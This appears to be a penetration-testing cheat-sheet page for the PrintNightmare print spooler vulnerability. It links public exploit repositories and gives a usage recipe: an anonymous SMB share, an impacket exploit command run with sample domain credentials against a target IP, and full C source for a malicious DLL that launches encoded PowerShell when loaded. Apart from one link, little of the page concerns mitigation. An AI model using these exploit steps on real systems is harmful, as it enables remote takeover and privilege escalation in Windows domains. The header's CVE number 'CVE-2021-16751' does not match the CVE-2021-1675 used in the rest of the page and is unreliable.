# PrintNightmare

**CVE-2021-16751, CVE-2021-34527**




## Exploits



### C++ (Forked from Original)

RCE:

* [https://github.com/afwu/PrintNightmare](https://github.com/afwu/PrintNightmare)

LPE:

* [https://github.com/hlldz/CVE-2021-1675-LPE](https://github.com/hlldz/CVE-2021-1675-LPE)



### Python (impacket)

RCE:

* [https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)


#### Usage

1. Prepare [an SMB share with anonymous authentication](/pentest/infrastructure/ad/smb#smb-share-with-null-authentication) allowed:
2. Generate an evil DLL: *msfvenom* / `adduser` ([1](https://github.com/newsoft/adduser), [2](https://github.com/calebstewart/CVE-2021-1675/blob/main/nightmare-dll/nightmare/dllmain.cpp)) / custom (see example below, `pwn.c`).
3. Run the exploit:

```
$ python CVE-2021-1675.py megacorp.local/snovvcrash:'Passw0rd!'@192.168.1.11 '\\10.10.13.37\share\pwn.dll'
```

{% code title="pwn.c" %}
```c
// x86_64-w64-mingw32-gcc pwn.c -o pwn.dll -shared

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

// Default function that is executed when the DLL is loaded
void Entry() {
    system("powershell -enc <BASE64_PWSH_CODE>");
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
  switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
      CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Entry, 0, 0, 0);
      break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE;
}
```
{% endcode %}

An example on configuring and abusing RBCD on a DC and DCSyncing the domain üëâüèª [here](https://snovvcrash.rocks/2021/06/30/leveraging-printnightmare-to-abuse-rbcd.html).



### C\#

RCE + LPE:

* [https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare)



### PowerShell

LPE:

* [https://github.com/calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)




## Mitigation

* [https://github.com/LaresLLC/CVE-2021-1675](https://github.com/LaresLLC/CVE-2021-1675)
